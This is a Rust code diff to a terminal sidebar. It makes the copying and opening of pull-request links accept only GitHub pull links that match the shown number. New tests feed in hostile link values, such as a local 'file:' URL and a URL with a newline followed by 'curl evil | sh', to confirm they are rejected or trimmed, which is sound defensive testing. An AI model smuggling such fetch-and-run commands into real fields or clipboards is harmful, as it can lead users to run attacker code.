@@ -36,7 +36,7 @@
 
 use std::collections::{BTreeMap, HashMap, HashSet};
 use std::fmt;
-use std::num::NonZeroU64;
+use std::num::{NonZeroU32, NonZeroU64};
 use std::ops::Range;
 use std::time::{Duration, Instant, SystemTime};
 
@@ -87,7 +87,7 @@ use crate::order::{Colour, Order};
 use crate::own::{Look, Looked, OwnClient, Unplaced};
 use crate::picker::{Here, Listing, Live, Runs, Seated, Shown};
 use crate::printed::Printed;
-use crate::pull::{Link, Ready, Work, Worked};
+use crate::pull::{Kind, Link, Ready, Work, Worked};
 use crate::skills::{Name, Skill};
 use crate::spots::{Drawn, Keyed, Spots};
 use crate::zellij::{Closes, Open, SessionName, Tab, Within};
@@ -98,9 +98,6 @@ pub const COLUMNS: u16 = 32;
 /// How long the notes say a pull request's link was copied, where no key takes
 /// that back sooner: a click on its number can leave the keys with zellij.
 const COPIED_SHOWS: Duration = Duration::from_secs(3);
-
-/// Which of a pane's lines shows its branch, and so its pull request's number.
-const CHECKOUT_LINE: usize = 1;
 
 /// The fewest columns the sidebar is dragged to, where the terminal has twice
 /// as many: enough for a session's name on its row.
@@ -708,29 +705,37 @@ struct Checkout {
 /// of its state.
 #[derive(Clone, Debug, PartialEq, Eq)]
 struct Numbered {
-    number: u32,
+    number: Number,
     colour: Color,
-    /// Its page on GitHub. A daemon older than the page does not say it.
-    url: Option<String>,
+}
+
+/// A pull request's number on its branch's line: its link says it where it has
+/// one, so that what the row shows and what a click copies are of one pull
+/// request.
+#[derive(Clone, Debug, PartialEq, Eq)]
+enum Number {
+    Linked(Box<Link>),
+    /// Its daemon says no link of this number on GitHub: older than the link,
+    /// or on another host, or with what does not read as one.
+    Unlinked(NonZeroU32),
 }
 
 impl Numbered {
     /// How its branch's line shows it.
     fn shown(&self) -> String {
-        format!("#{}", self.number)
+        match &self.number {
+            Number::Linked(link) => link.tab(),
+            Number::Unlinked(number) => format!("#{number}"),
+        }
     }
 
-    /// Its link, where the daemon said it.
-    fn link(&self) -> Option<PullLink> {
-        Some(PullLink { number: self.number, url: self.url.clone()? })
+    /// Its link, where it has one.
+    fn link(&self) -> Option<&Link> {
+        match &self.number {
+            Number::Linked(link) => Some(link),
+            Number::Unlinked(_) => None,
+        }
     }
-}
-
-/// A pull request's link, and the number a note says it by.
-#[derive(Clone, Debug, PartialEq, Eq)]
-pub struct PullLink {
-    pub number: u32,
-    pub url: String,
 }
 
 impl Row {
@@ -1014,9 +1019,9 @@ pub enum Asked {
     /// Take the focus from zellij, as a click on the sidebar does.
     Take,
     /// Put this on the clipboard of luneta's terminal.
-    Copy(String),
+    Copy(Link),
     /// Open this page in the browser of the machine luneta runs on.
-    Browse(String),
+    Browse(Link),
     /// Give the focus back to zellij.
     Leave,
     /// Ask zellij on `on` what closing the pane `pane` of `session` closes,
@@ -1191,7 +1196,7 @@ pub struct Sidebar {
     notice: Option<String>,
     /// The number of the pull request whose link was copied last, and when,
     /// for the notes to say, until the next key or `COPIED_SHOWS` from then.
-    copied: Option<(u32, SystemTime)>,
+    copied: Option<(NonZeroU32, SystemTime)>,
     /// The machine an image is on its way to, once that takes a while.
     image_going: Option<Destination>,
     /// What is being read aloud, or what that waits for.
@@ -2596,15 +2601,15 @@ impl Sidebar {
 
     /// The link of the pull request the highlighted row shows the number of;
     /// or why there is none.
-    fn highlighted_link(&self) -> Result<PullLink, String> {
+    fn highlighted_link(&self) -> Result<Link, String> {
         let row = self.cursor.as_ref().and_then(|spot| self.row_of(spot));
         let Some(Row::Pane { checkout: Some(Checkout { pull_request: Some(numbered), .. }), .. }) =
             row.map(|at| &self.rows[at])
         else {
             return Err("no pull request on this row".to_owned());
         };
-        numbered.link().ok_or_else(|| {
-            format!("{}: lunetad does not say its link, being older than luneta", numbered.shown())
+        numbered.link().cloned().ok_or_else(|| {
+            format!("{}: lunetad says no link of it on github.com", numbered.shown())
         })
     }
 
@@ -2622,16 +2627,16 @@ impl Sidebar {
 
     /// Has luneta copy `link`, at `now`, which the notes say, as a copy shows
     /// nothing on its own.
-    fn copy(&mut self, link: PullLink, now: SystemTime) -> Asked {
-        self.copied = Some((link.number, now));
-        Asked::Copy(link.url)
+    fn copy(&mut self, link: Link, now: SystemTime) -> Asked {
+        self.copied = Some((link.number(), now));
+        Asked::Copy(link)
     }
 
     /// `o`: has luneta open the highlighted row's pull request in your
     /// browser, or says why there is none.
     fn browse(&mut self) -> Asked {
         match self.highlighted_link() {
-            Ok(link) => Asked::Browse(link.url),
+            Ok(link) => Asked::Browse(link),
             Err(why) => {
                 self.notify(why);
                 Asked::Nothing
@@ -2643,7 +2648,7 @@ impl Sidebar {
     /// whichever row: copies its link and nothing else, wherever the keys and
     /// the highlight are. It drops what the key before waits for, as any
     /// click does.
-    pub fn number_clicked(&mut self, link: PullLink, now: SystemTime) -> Asked {
+    pub fn number_clicked(&mut self, link: Link, now: SystemTime) -> Asked {
         self.notice = None;
         self.pending = Pending::Nothing;
         self.copy(link, now)
@@ -3862,20 +3867,20 @@ impl Sidebar {
             None => (0..self.rows.len()).collect::<Vec<_>>(),
         };
         let mut drawn: Vec<Line<'static>> = Vec::new();
-        // Each number's line among all those of the rows, its columns and its
-        // link. None takes a click under what the mouse lifted.
+        // Where each number is, by its line among all those of the rows. None
+        // takes a click under what the mouse lifted.
         let mut numbers = Vec::new();
         for at in order {
             let row = &self.rows[at];
-            if landing.is_none()
-                && let Row::Pane { checkout: Some(checkout), .. } = row
-                && let Some((columns, link)) = number_at(checkout, width)
-            {
-                numbers.push((drawn.len() + CHECKOUT_LINE, columns, link));
-            }
             let on = lit.as_ref().filter(|(rows, _)| rows.contains(&at));
             let background = on.map(|(_, background)| *background);
-            for mut line in row_lines(row, width, frame, now) {
+            let (row_drawn, number) = row_lines(row, width, frame, now);
+            if landing.is_none()
+                && let Some(number) = number
+            {
+                numbers.push(NumberAt { line: drawn.len() + number.line, ..number });
+            }
+            for mut line in row_drawn {
                 if let Some(background) = background {
                     line = line.patch_style(Style::new().bg(background));
                 }
@@ -3890,9 +3895,9 @@ impl Sidebar {
         put(buffer, area, &lines, self.framing());
         let mut spots = Spots::default();
         let shown = self.top..self.top + room;
-        for (line, columns, link) in numbers {
+        for NumberAt { line, columns, link } in numbers {
             if shown.contains(&line) {
-                spots.add(HEADER + line - self.top, columns, link);
+                spots.add(HEADER + line - self.top, columns, link.clone());
             }
         }
         // The rows and the notes go short of the edge, the notes along the
@@ -4567,7 +4572,9 @@ fn checkout(tree: &WorkTree, pull_request: Option<&PullRequest>) -> Option<Check
 
 /// A pull request as its branch's line shows it, in the colour of its state,
 /// which gh lists it in: green while it is open, grey while it is a draft, and
-/// purple once it is merged. A closed one is none.
+/// purple once it is merged. A closed one is none. What its daemon says of its
+/// page is taken only as this pull request's link: another machine's says it,
+/// and the clipboard and the browser take what they are handed.
 fn numbered(pull_request: &PullRequest) -> Option<Numbered> {
     let colour = match pull_request.state {
         State::Open => gruvbox::GREEN,
@@ -4575,8 +4582,11 @@ fn numbered(pull_request: &PullRequest) -> Option<Numbered> {
         State::Merged => gruvbox::PURPLE,
         State::Closed => return None,
     };
-    let number = pull_request.number.get();
-    Some(Numbered { number, colour, url: pull_request.url.clone() })
+    let number = pull_request.number;
+    let link = pull_request.url.as_deref().and_then(Link::parse);
+    let link = link.filter(|link| link.kind() == Kind::Pull && link.number() == number);
+    let number = link.map_or(Number::Unlinked(number), |link| Number::Linked(Box::new(link)));
+    Some(Numbered { number, colour })
 }
 
 /// The glyph of each kind of change there is, then the one for where the
@@ -4624,8 +4634,23 @@ pub fn frame(now: SystemTime) -> usize {
     usize::try_from(turns % frames).expect("a frame of the spinner's")
 }
 
-/// The lines a row is drawn on, `width` wide.
-fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line<'static>> {
+/// Where the number of a pull request with a link is, on the lines of a row, for
+/// a click to copy that link.
+struct NumberAt<'a> {
+    /// Which of them it is on.
+    line: usize,
+    columns: Range<usize>,
+    link: &'a Link,
+}
+
+/// The lines a row is drawn on, `width` wide, and where they have a number that
+/// takes a click.
+fn row_lines(
+    row: &Row,
+    width: usize,
+    frame: usize,
+    now: SystemTime,
+) -> (Vec<Line<'static>>, Option<NumberAt<'_>>) {
     let dim = Style::new().add_modifier(Modifier::DIM);
     match row {
         Row::Machine { name, heads: Heads::Away(away), .. } => {
@@ -4636,7 +4661,7 @@ fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line
             let reserve = if age.is_empty() { 0 } else { age.width() + 1 };
             let said = cut(&format!("{name} · {word}"), width.saturating_sub(5 + reserve + 1));
             let gap = width.saturating_sub(5 + said.width() + age.width() + 1);
-            vec![Line::from(vec![
+            let line = Line::from(vec![
                 Span::raw(" "),
                 Span::styled(FOLDED, dim),
                 Span::raw(" "),
@@ -4645,7 +4670,8 @@ fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line
                 Span::styled(said, dim),
                 Span::raw(" ".repeat(gap)),
                 Span::styled(age, dim),
-            ])]
+            ]);
+            (vec![line], None)
         },
         Row::Machine { name, heads: Heads::Sessions { under, waiting, dot, busy, here }, .. } => {
             let folded = *under == Under::Folded;
@@ -4671,7 +4697,7 @@ fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line
                 spans.push(Span::raw(" "));
                 spans.push(badge);
             }
-            vec![Line::from(spans)]
+            (vec![Line::from(spans)], None)
         },
         Row::Session { session, hits, under, here, colour, waiting, dot, busy, .. } => {
             let folded = *under == Under::Folded;
@@ -4696,7 +4722,7 @@ fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line
                 spans.push(Span::raw(" "));
                 spans.push(badge);
             }
-            vec![Line::from(spans)]
+            (vec![Line::from(spans)], None)
         },
         Row::Pane {
             here, unread, marked, icon, label, hits, checkout, review, bracket, speaks, ..
@@ -4741,14 +4767,21 @@ fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line
             }
             spans.push(Span::styled(age, dim));
             let mut lines = vec![Line::from(spans)];
+            let mut number = None;
             if let Some(checkout) = checkout {
-                lines.push(checkout_line(*here, gutter(*bracket, 1, height), checkout, width));
+                let at = lines.len();
+                let (drawn, columns) =
+                    checkout_line(*here, gutter(*bracket, at, height), checkout, width);
+                lines.push(drawn);
+                let link = checkout.pull_request.as_ref().and_then(Numbered::link);
+                let number_at = |(columns, link)| NumberAt { line: at, columns, link };
+                number = columns.zip(link).map(number_at);
             }
             if let Some(review) = review {
                 let at = lines.len();
                 lines.push(review_line(*here, gutter(*bracket, at, height), review, width));
             }
-            lines
+            (lines, number)
         },
     }
 }
@@ -4862,19 +4895,21 @@ fn gutter(bracket: Option<(Bracket, Color)>, at: usize, height: usize) -> Span<'
 /// works, under its label, then the number of its pull request, and how its
 /// work tree stands. The branch is cut to leave the other two whole. The mark
 /// of the pane luneta's zellij is on, `here`, runs down it too, and the
-/// `gutter` after it.
+/// `gutter` after it. And the columns the number is on, as the line has it, for
+/// a click to go by.
 fn checkout_line(
     here: bool,
     gutter: Span<'static>,
     checkout: &Checkout,
     width: usize,
-) -> Line<'static> {
+) -> (Line<'static>, Option<Range<usize>>) {
     let status = &checkout.status;
     let number = checkout.pull_request.as_ref().map(|numbered| {
         Span::styled(numbered.shown(), Style::new().fg(numbered.colour))
     });
     let held = number.as_ref().map_or(0, |number| number.content.width() + 1);
-    let branch = branch_shown(checkout, width);
+    let reserve = if status.is_empty() { 0 } else { status.width() + 1 };
+    let branch = cut(&checkout.branch, width.saturating_sub(LABEL + held + reserve + 1));
     let gap = width.saturating_sub(LABEL + branch.width() + held + status.width() + 1);
     let mut spans = vec![
         margin(here),
@@ -4882,34 +4917,16 @@ fn checkout_line(
         Span::raw(" ".repeat(LABEL - 2)),
         Span::styled(branch, Style::new().fg(gruvbox::GREY)),
     ];
+    let mut columns = None;
     if let Some(number) = number {
         spans.push(Span::raw(" "));
+        let start: usize = spans.iter().map(Span::width).sum();
+        columns = Some(start..start + number.width());
         spans.push(number);
     }
     spans.push(Span::raw(" ".repeat(gap)));
     spans.push(Span::raw(status.clone()));
-    Line::from(spans)
-}
-
-/// The branch of `checkout` as the line under a pane's row shows it, `width`
-/// wide: cut to leave the number of its pull request and how its work tree
-/// stands whole.
-fn branch_shown(checkout: &Checkout, width: usize) -> String {
-    let number = checkout.pull_request.as_ref();
-    let held = number.map_or(0, |number| number.shown().width() + 1);
-    let status = &checkout.status;
-    let reserve = if status.is_empty() { 0 } else { status.width() + 1 };
-    cut(&checkout.branch, width.saturating_sub(LABEL + held + reserve + 1))
-}
-
-/// The columns of the line under a pane's row, `width` wide, where the number
-/// of the pull request of `checkout` is, past the branch and a space, with its
-/// link: none for one whose daemon did not say it, which no click copies.
-fn number_at(checkout: &Checkout, width: usize) -> Option<(Range<usize>, PullLink)> {
-    let numbered = checkout.pull_request.as_ref()?;
-    let link = numbered.link()?;
-    let start = LABEL + branch_shown(checkout, width).width() + 1;
-    Some((start..start + numbered.shown().width(), link))
+    (Line::from(spans), columns)
 }
 
 /// The panes of `listed`, among `all` the sessions of a machine and its
@@ -5032,7 +5049,6 @@ pub fn wrapped(text: &str, width: usize, style: Style) -> Vec<Line<'static>> {
 
 #[cfg(test)]
 mod tests {
-    use std::num::NonZeroU32;
     use std::sync::LazyLock;
 
     use lunetad::api::shell::{ended, Ended, Going, Stopped};
@@ -7209,6 +7225,11 @@ mod tests {
 
     const LINK: &str = "https://github.com/owner/repo/pull/246";
 
+    /// What `LINK` reads as.
+    fn link() -> Link {
+        Link::parse(LINK).expect("a link")
+    }
+
     /// The branch `branch` checked out in `dir`, with `pull` for its pull
     /// request, as lunetad says them in `work_trees` and `pull_requests`.
     fn checked_out(
@@ -7237,9 +7258,10 @@ mod tests {
         let panes = dirs.iter().zip(1..).map(|(cwd, id)| pane(id, id, cwd, "fish")).collect();
         let mut host = host(vec![session("s", 10, panes)], Vec::new());
         let (trees, pulls) = (&mut host.work_trees, &mut host.pull_requests);
+        let closed = "https://github.com/owner/repo/pull/9";
         checked_out(trees, pulls, "/w/a", "fix", Some((246, State::Open, Some(LINK))));
         checked_out(trees, pulls, "/w/b", "old", Some((7, State::Open, None)));
-        checked_out(trees, pulls, "/w/c", "gone", Some((9, State::Closed, Some(LINK))));
+        checked_out(trees, pulls, "/w/c", "gone", Some((9, State::Closed, Some(closed))));
         checked_out(trees, pulls, "/w/d", "none", None);
         let mut sidebar = fresh();
         sidebar.heard(host);
@@ -7268,7 +7290,7 @@ mod tests {
         let rule = format!("─ Yank {}", "─".repeat(24));
         assert_eq!(lines[22..], [rule, " p  PR link".to_owned()]);
 
-        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(LINK.to_owned()));
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(link()));
         let buffer = drawn_at(&mut sidebar, true, 32, 24, now);
         let (lines, _) = seen_at(&mut sidebar, true, 32, 24, now);
         let note = lines.iter().position(|line| line == " copied #246").expect("the note");
@@ -7284,7 +7306,7 @@ mod tests {
         assert!(!shown(&mut sidebar, 163_000));
 
         assert_eq!(sidebar.key(&char('y'), now), Asked::Nothing);
-        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(LINK.to_owned()));
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(link()));
         sidebar.key(&char('j'), now);
         assert_eq!(sidebar.copied, None);
     }
@@ -7318,7 +7340,7 @@ mod tests {
         // The pointer moving is no click: luneta hears every move.
         sidebar.key(&char('y'), now);
         sidebar.mouse(mouse(MouseEventKind::Moved, 10, 4), area);
-        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(LINK.to_owned()));
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(link()));
     }
 
     /// A click on the `y` of the legend presses it, and on the `p` that takes
@@ -7332,7 +7354,7 @@ mod tests {
         let clicked = clicks(&mut sidebar, 17);
         assert_eq!(clicked[1], (" p  PR link".to_owned(), Some(on_legend('p'))));
         let copied = sidebar.keys_clicked(Keyed::Legend, &char('p'), now);
-        assert_eq!(copied, Asked::Copy(LINK.to_owned()));
+        assert_eq!(copied, Asked::Copy(link()));
     }
 
     /// `y p` and `o` go by the number the row shows: where it shows none, or
@@ -7341,7 +7363,7 @@ mod tests {
     #[test]
     fn the_keys_only_leave_a_note_on_a_row_with_no_link() {
         let none = "no pull request on this row";
-        let old = "#7: lunetad does not say its link, being older than luneta";
+        let old = "#7: lunetad says no link of it on github.com";
         let rows = [
             (Spot::Local(pane_of("s", 10, 2)), old),
             (Spot::Local(pane_of("s", 10, 3)), none),
@@ -7363,6 +7385,65 @@ mod tests {
         }
     }
 
+    /// A pull request numbered 5, as its daemon says it, with `said` for its
+    /// page, on the branch of the pane 1 of a session `s`.
+    fn pull_said(said: &str) -> Sidebar {
+        let panes = vec![pane(1, 1, "/w/a", "fish")];
+        let mut host = host(vec![session("s", 10, panes)], Vec::new());
+        let (trees, pulls) = (&mut host.work_trees, &mut host.pull_requests);
+        checked_out(trees, pulls, "/w/a", "fix", Some((5, State::Open, Some(said))));
+        let mut sidebar = fresh();
+        sidebar.heard(host);
+        sidebar.focus(Keys::Sidebar);
+        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
+        sidebar
+    }
+
+    /// What a daemon says of a page goes no further than its row unless it
+    /// reads as the link of that very number, as another machine's says it,
+    /// and the clipboard and the browser take what they are handed. The row
+    /// shows its number all the same, which takes no click, and the keys only
+    /// leave a note.
+    #[test]
+    fn a_page_that_is_not_the_link_of_the_number_stays_on_the_row() {
+        let now = moment(160_000);
+        for said in [
+            "https://github.com/owner/repo/pull/6",
+            "https://github.com/owner/repo/issues/5",
+            "https://ghe.example/owner/repo/pull/5",
+            "file:///tmp/run.desktop",
+            "https://github.com/owner/repo/pull/5\ncurl evil | sh",
+        ] {
+            let mut sidebar = pull_said(said);
+            let area = Rect::new(0, 0, 32, 24);
+            let mut buffer = Buffer::empty(area);
+            let drawn = sidebar.draw(&mut buffer, area, now);
+            let line: String = (0..31).map(|x| buffer[(x, 6)].symbol()).collect();
+            assert!(line.contains("fix #5"), "{said:?}: {line}");
+            assert!(number_spot(&drawn, 6).is_empty(), "{said:?}");
+
+            let note = "#5: lunetad says no link of it on github.com";
+            sidebar.key(&char('y'), now);
+            assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing, "{said:?}");
+            assert_eq!(sidebar.notice.as_deref(), Some(note));
+            assert_eq!(sidebar.copied, None);
+            assert_eq!(sidebar.key(&char('o'), now), Asked::Nothing, "{said:?}");
+            assert_eq!(sidebar.notice.as_deref(), Some(note));
+        }
+    }
+
+    /// What is copied and opened is the link as luneta spells it again, with
+    /// nothing of what came after its number.
+    #[test]
+    fn a_page_that_reads_is_taken_as_luneta_spells_it() {
+        let now = moment(160_000);
+        let mut sidebar = pull_said("https://github.com/owner/repo/pull/5?\ncurl evil | sh");
+        let Asked::Browse(link) = sidebar.key(&char('o'), now) else {
+            panic!("the row's link opens");
+        };
+        assert_eq!(link.url(), "https://github.com/owner/repo/pull/5");
+    }
+
     /// `o` opens the link of the highlighted row, and neither it nor `y p`
     /// asks anything of another machine: its daemon said the link, and luneta
     /// runs where you sit.
@@ -7371,10 +7452,11 @@ mod tests {
         let mut sidebar = pulls();
         sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
         let now = moment(160_000);
-        assert_eq!(sidebar.key(&char('o'), now), Asked::Browse(LINK.to_owned()));
+        assert_eq!(sidebar.key(&char('o'), now), Asked::Browse(link()));
         assert_eq!(sidebar.copied, None, "what opens shows");
 
         let far = "https://github.com/owner/repo/pull/8";
+        let far_link = Link::parse(far).expect("a link");
         let mut host = machines();
         let Reached::Host(there) = host.remotes[0].reached.as_mut().unwrap() else {
             panic!("nixos is reached");
@@ -7386,9 +7468,9 @@ mod tests {
         sidebar.focus(Keys::Sidebar);
         let place = Place::Pane(PanePlace { session: listed("main", 20), pane: 1 });
         sidebar.cursor = Some(Spot::Remote(nixos(), place));
-        assert_eq!(sidebar.key(&char('o'), now), Asked::Browse(far.to_owned()));
+        assert_eq!(sidebar.key(&char('o'), now), Asked::Browse(far_link.clone()));
         sidebar.key(&char('y'), now);
-        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(far.to_owned()));
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(far_link));
     }
 
     /// The number is a spot of its own, on exactly the columns it is drawn
@@ -7404,8 +7486,9 @@ mod tests {
         host.sessions[0].panes.as_mut().unwrap().panes.extend(panes);
         let (trees, pulls) = (&mut host.work_trees, &mut host.pull_requests);
         let long = "handoff-eng-11259-and-more";
-        checked_out(trees, pulls, "/w/e", long, Some((4321, State::Merged, Some(LINK))));
-        checked_out(trees, pulls, "/w/f", "日本語の枝の名前が長い", Some((12, State::Draft, Some(LINK))));
+        let (merged, draft) = (LINK.replace("246", "4321"), LINK.replace("246", "12"));
+        checked_out(trees, pulls, "/w/e", long, Some((4321, State::Merged, Some(&merged))));
+        checked_out(trees, pulls, "/w/f", "日本語の枝の名前が長い", Some((12, State::Draft, Some(&draft))));
         let host = sidebar.host.clone().unwrap();
         sidebar.heard(host);
 
@@ -7428,7 +7511,7 @@ mod tests {
             assert_eq!(number_spot(&drawn, 14), columns(14, "#4321"));
             assert_eq!(number_spot(&drawn, 16), columns(16, "#12"));
             let on = drawn.at(Position::new(columns(6, "#246")[0], 6));
-            assert_eq!(on, Some(Hit::Number(PullLink { number: 246, url: LINK.to_owned() })));
+            assert_eq!(on, Some(Hit::Number(link())));
         }
     }
 
@@ -7476,19 +7559,18 @@ mod tests {
         let mut sidebar = pulls();
         sidebar.focus(Keys::Zellij);
         let here = sidebar.cursor.clone();
-        let link = PullLink { number: 246, url: LINK.to_owned() };
         let now = moment(160_000);
         sidebar.notify("what went wrong before".to_owned());
-        assert_eq!(sidebar.number_clicked(link.clone(), now), Asked::Copy(LINK.to_owned()));
+        assert_eq!(sidebar.number_clicked(link(), now), Asked::Copy(link()));
         assert_eq!(sidebar.cursor, here);
         assert_eq!(sidebar.keys, Keys::Zellij);
         assert_eq!(sidebar.notice, None);
-        assert_eq!(sidebar.copied, Some((246, now)));
+        assert_eq!(sidebar.copied, Some((link().number(), now)));
 
         sidebar.focus(Keys::Sidebar);
         sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
         sidebar.key(&char('y'), now);
-        sidebar.number_clicked(link, now);
+        sidebar.number_clicked(link(), now);
         assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing);
     }
     /// Each line of the sidebar drawn 32 by 19, from the line `from` down, as
